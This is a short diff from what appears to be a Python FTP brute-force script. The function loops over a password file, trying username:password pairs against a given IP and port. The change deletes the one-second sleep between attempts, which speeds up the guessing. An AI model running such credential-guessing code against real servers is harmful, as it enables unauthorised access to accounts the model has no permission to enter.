@@ -7,7 +7,6 @@ def brute_force_ftp(ip, port, username, password_file):
         passwords = file.readlines()
 
     for password in passwords:
-        time.sleep(1)
         password = password.strip()
         try:
             print(f"Trying {username}:{password}")
